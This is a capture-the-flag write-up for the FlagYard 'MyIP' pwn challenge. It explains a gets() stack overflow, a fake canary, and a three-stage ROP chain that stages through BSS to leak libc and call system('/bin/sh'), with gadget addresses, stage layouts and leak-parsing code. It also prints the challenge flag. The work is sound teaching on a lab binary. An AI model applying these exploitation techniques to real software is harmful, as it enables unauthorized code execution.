# FlagYard CTF — MyIP

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** Flagyard
- **Category:** Pwn
- **Difficulty:** Medium (متوسط)

> *"سهل كل شي تست用到 فيها `gets`"* — easy, everything in here uses `gets`

---

## The short version

An "ICMP packet handler" reads an 8-byte header, dispatches on the type
byte, and for **type 8** hands the rest of the packet straight to
`gets()`. There is **no canary** (the "stack guard" stores a constant and
compares it to itself) and `main` is **one-shot**, so the ROP chain cannot
loop — it has to be *staged through BSS* with two extra `gets()` calls:

1. Send the 8-byte header `08 00 00 00 00 00 00 00` to reach the vulnerable
   handler.
2. Overflow `gets(rbp-0x40)` → `gets(0x405300)` → `leave;ret` (pivot to BSS).
3. Stage 2 leaks libc with `puts(puts@GOT)` and calls `gets(0x405900)` →
   `leave;ret` (pivot again).
4. Stage 3: `pop rdi ; &"/bin/sh" ; ret ; system` → **shell**.
5. `cat /app/flag`.

**Flag:** `FlagY{8cb9404808fc07de84436e4fe18e3141}`

---

## First look

```bash
$ file chall
ELF 64-bit LSB executable, x86-64, dynamically linked
$ checksec chall
RELRO: Partial RELRO   Stack: No canary   NX: enabled   PIE: disabled
```

No canary and no PIE — the two things that would have made this interesting.
What actually makes it interesting is the *combination* of a `gets()` with
a **single-shot** `main` and a **tiny BSS**.

```
MyIP ICMP Handler v1.0
Send your ICMP packet:
```

`main` (0x401276) reads exactly 8 bytes into a stack buffer and switches on
byte 0:

```c
read(0, pkt, 8);                       // 0x401144  read@plt
switch (pkt[0]) {
    case 8:  handle_echo_request();     // 0x4019cb -> 0x401495
             printf("[LOG] %s", ...);
             break;
    default: puts("Unsupported ICMP type.");
}
puts("Handler exiting.");
return 0;                              // <-- process is done after ONE packet
```

`handle_echo_request` (0x401495) is the interesting one:

```c
char buf[0x40];
gets(buf);                             // 0x4014c6   <-- the bug
if (strlen(buf) == 4 && magic_ok())    // cosmetic "ICMP magic" check
    puts("Magic validated");
printf("Payload processed: %s\n", buf);
*(unsigned long *)(rbp-0x20) = 0xdeadbeefcafebabe;   // 0x402385 "canary"
if (*(unsigned long *)(rbp-0x20) != 0xdeadbeefcafebabe)   // compares to itself
    puts("Stack smashing detected!");                  // never fires
```

The saved RIP sits at offset `0x48` of the buffer. The binary also ships a
handful of decoys (`Backdoor activated...`, `Admin console ready.`,
`Root access granted... NOT.`, `Spawning shell... NOT.`) that all print a
joke string and return — pure noise, and none of them is reachable from the
type-8 path anyway. Ignore them.

Because `main` prints `Handler exiting.` and returns, we get **exactly one
`gets()`** and no loop to re-enter. Everything else has to be smuggled in
through writable memory we can address by a constant.

---

## Gadgets

Everything useful is in the binary itself — the binary is small enough that
`pop rdi ; ret` and friends are all we need:

| Gadget | Address |
|---|---|
| `pop rdi ; ret` | `0x401513` |
| `pop rbp ; ret` | `0x401516` |
| `leave ; ret` | `0x401602` |
| `ret` | `0x401494` |
| `gets@plt` | `0x401164` |
| `puts@plt` | `0x4010e4` |
| `puts@GOT` | `0x405000` |

⚠️ **Do not use `0x40150a` as your `ret`.** It is a real `ret` instruction,
but the *address* contains the byte `0x0a` — and `gets()` stops at the first
newline, so any payload holding `p64(0x40150a)` gets truncated and the chain
dies at the jump. Every gadget address in this writeup has been checked for
a `0x0a` in its first three bytes.

From the bundled **glibc 2.39** (`libc.so.6` + `ld-linux-x86-64.so.2`, run
via `--library-path .`):

```python
LIB_PUTS   = 0x87be0      # puts
LIB_SYSTEM = 0x58750      # system
LIB_BINSH  = 0x1cb42f     # "/bin/sh" string
```

No libc gadget is required at all — which is lucky, because this libc has
almost none worth having (see trap #2).

---

## Staging through BSS

The writable segment is tiny:

```
LOAD vaddr=0x404df8 memsz=0x6d8 flags=RW     ->  0x404df8 .. 0x4054d0
```

`0x405000`–`0x406000` is one mapped page, so the *addressable* BSS reaches up
to `0x406000` even though the segment only declares up to `0x4054d0`. That
distinction turns out to be the whole ballgame.

```
0x405080  <stdout@GLIBC_2.2.5>
0x405090  <stdin@GLIBC_2.2.5>
0x4050a0  <stderr@GLIBC_2.2.5>
0x4054d0  <end of declared BSS>
0x406000  <end of the mapped page>
```

**Stage 1** — overflow, read stage 2 into BSS, pivot there:

```
0x00  'A' * 0x40
0x40  rbp    = 0x405300        # REGION_A
0x48  ret    = 0x401494        # extra ret for stack alignment
0x50  pop rdi
0x58  rdi    = 0x405300
0x60  gets                    # reads stage 2 from stdin
0x68  pop rbp
0x70  rbp    = 0x405300
0x78  leave ; ret             # pivots to 0x405308
```

**Stage 2** (written at `0x405300`) — leak libc, read stage 3, pivot:

```
0x405300  junk (rbp)
0x405308  ret
0x405310  pop rdi
0x405318  0x405000              # &puts@GOT
0x405320  puts@plt              # prints the resolved libc puts address
0x405328  pop rdi
0x405330  0x405900              # REGION_B
0x405338  gets@plt              # reads stage 3
0x405340  pop rbp
0x405348  0x405900
0x405350  leave ; ret
```

**Stage 3** (written at `0x405900`) — the money shot:

```
0x405900  junk (rbp)
0x405908  pop rdi
0x405910  libc + 0x1cb42f       # "/bin/sh" straight out of libc
0x405918  ret                   # keeps rsp == 8 (mod 16) at the call
0x405920  libc + 0x58750        # system
```

The leak is only 6 raw bytes (`puts` stops at the first `0x00`, and a libc
address looks like `0x00007f????????`), so parse it by pattern instead of by
length:

```python
def find_puts(data):
    for i in range(len(data) - 5):
        if data[i + 5] != 0x7f:  continue
        v = u64(data[i:i+6].ljust(8, b"\x00"))
        b = v - 0x87be0
        if 0x7f0000000000 <= b <= 0x7fffffffffff and b % 0x1000 == 0:
            return b                # libc base
    return None
```

The `b % 0x1000 == 0` test is what makes it reliable: it rejects every
6-byte window that merely *looks* like an address.

---

## The three traps that *should* have caught us

### Trap #1 — the "stack guard" is a lie

```
0x403138  "Stack smashing detected!"
```

This string is bait. `0x402385` writes `0xdeadbeefcafebabe` to `[rbp-0x20]`
and then compares `[rbp-0x20]` against the *same constant*. It is a canary
that can never trigger, so there is no brute force and no leak to hunt for —
just a straight overflow. Ignore the string and keep going.

### Trap #2 — the libc gadget that isn't there

The interesting decoy is libc's **first LOAD segment**:

```
off=0x000000 vaddr=0x000000 memsz=0x027390 flags=R     <-- data, NOT executable
off=0x028000 vaddr=0x028000 memsz=0x187d39 flags=RX    <-- the real .text
off=0x1b0000 vaddr=0x1b0000 memsz=0x04e082 flags=R
off=0x1fec60 vaddr=0x1ffc60 memsz=0x012130 flags=RW
```

Byte-scanning the whole file for `5a c3` happily reports **`libc + 0x8d6a`**
as `pop rdx ; ret`. It is not a gadget. `0x8d6a` is far below the
executable segment (`0x28000`–`0x1afd39`), so it lives in read-only data and
jumping there is an instant `SIGSEGV`. Every raw-syscall attempt built on it
died at the first `syscall` with no output whatsoever.

And the deeper truth is worse: after filtering by `p_flags & PF_X`, **this
libc has no `pop rdx; ret` at all**, and nothing that reliably zeroes `rdx`
either. `execve` needs `rdx = 0`, so a `syscall`-based `execve` is not
available. (For the same reason `libc + 0x110a7d`, the `pop rsi ; ret` that
worked in [3w](../3W/3W_Writeup.md), is fine here — but the classic
`pop rdx` at `0x8d6a` is a trap.) Use the PLT-free `system()` path instead.

**Lesson: always intersect a byte-scan with `p_flags & PF_X`, and print the
segment table when a gadget "doesn't work" — a segfaulting gadget is a
permissions problem, not a gadgets problem.**

### Trap #3 — `system()` needs a *real* stack, and BSS is 1 KB

This one cost the most time, because it fails **after a perfect leak** and
looks exactly like a broken chain.

The final `system()` call is a libc function, so it pushes a real frame onto
whatever `rsp` points at. Here `rsp` is inside BSS:

```
rsp = 0x405480  ->  room = 0x405480 - 0x405000 = 0x480 = 1152 bytes
rsp = 0x405900  ->  room = 0x405900 - 0x405000 = 0x900 = 2304 bytes
```

At `0x405480` that is **not enough**: `system()` walks off the bottom of the
writable page, hits the read-only `0x404000` page, and the process dies with
*no output at all* — the leak came through perfectly, then silence. The exact
same chain at `0x405900` works on the first try.

Two things make this easy to get wrong:

- **Staging lower is not safer.** The natural instinct is to keep ROP regions
  tidy and low, but everything below `0x405000` is the read-only `0x404000`
  page, and `0x405080`–`0x4050a0` hold the `stdout`/`stdin`/`stderr` `FILE*`
  globals. An early attempt used `0x4050b0`/`0x405200` and the *libc* call
  smashed those globals and the GOT below them. The stack grows **down**,
  so ROP regions must sit as **high** in the page as possible, and the last
  one as high as the *declared* BSS (`0x4054d0`) and the page (`0x406000`)
  allow.
- **The failure is silent.** No `SIGSEGV` message, no `Handler exiting.`, just
  a closed socket. Every reasonable hypothesis is wrong: not the gadget, not
  the leak, not the alignment — just stack depth.

Verified with a marker call before diagnosing it: `libc puts(0x403008)` from
the same region printed the banner, proving the pivot and the alignment were
fine and isolating the failure to the *depth* of the following call.

---

## Root causes (what actually made it exploitable)

| Bug | Where | Impact |
|---|---|---|
| `gets()` on the payload | `0x4014c6` | direct return-address overwrite at offset `0x48` |
| "canary" compares a constant to itself | `0x402385` | no stack canary, no brute force needed |
| `main` is one-shot | `0x401276` | forces the chain to be staged in BSS, not looped |
| `gets@plt` in the binary | `0x401164` | a second/third `gets` is available as a BSS *writer* |
| `puts@GOT` is readable | `0x405000` | Partial RELRO leaves the resolved libc `puts` in place |
| `leave ; ret` present | `0x401602` | stack pivot out of the handler into writable memory |
| libc ships with the challenge | `libc.so.6` | `system` + `"/bin/sh"` offsets are known up front |
| declared BSS is 0x6d8 | `0x404df8` | forces tight region placement — and punishes low placement (trap #3) |

> The decoy backdoor strings, the fake "stack smashing detected" path, and
> the `pop rdx` bytes in libc's read-only segment are all decorations.

---

## Takeaways

- **A `gets()` bug with no canary is the easy part.** The real work was
  everything *around* it: one-shot control flow, a 0x6d8-byte BSS, and a
  libc whose advertised gadgets are in the wrong segment.
- **A gadget that segfaults is a permissions bug.** `libc + 0x8d6a` looks
  exactly like `pop rdx ; ret` in a byte scan and is in read-only data. Print
  the `PT_LOAD` table and filter on `PF_X` before you trust anything.
- **BSS-as-stack has a budget, and the budget is the page.** `rsp` inside
  BSS gives you `rsp - page_start` bytes before you hit read-only memory.
  `system()` needs more than 1 KB; measure it and place the final chain at
  the top of the page.
- **Stage downward-to-upward, high to low.** Because the stack grows down,
  each pivot target should be *higher* than the last, leaving the maximum
  amount of room underneath the final libc call.
- **Validate leaks with alignment, not with regex.** `(addr - offset) % 0x1000
  == 0` is a one-line check that turns a fragile 6-byte guess into a
  deterministic parse.
- **When a chain dies silently *after* a successful leak, suspect resources,
  not correctness.** Alignment and gadgets are the usual suspects, but
  *available stack* is the one that produces zero output and no error.

---

## The exploit

Self-contained, colored version in the same folder:

```
myip_solve.py
```

Give it the target interactively (or as a CLI argument) and it walks home:

```bash
python3 myip_solve.py
  Enter the MyIP challenge target (host:port): tcp.flagyard.com:22948
```

It stages the chain, re-rolls the connection if a leaked address happens to
contain a `0x0a`, and on success prints the flag panel and saves it to
`flag_from_myip.txt` next to the script.

*سهل كل شي تست用到 فيها `gets`* — and it really was. 🏁
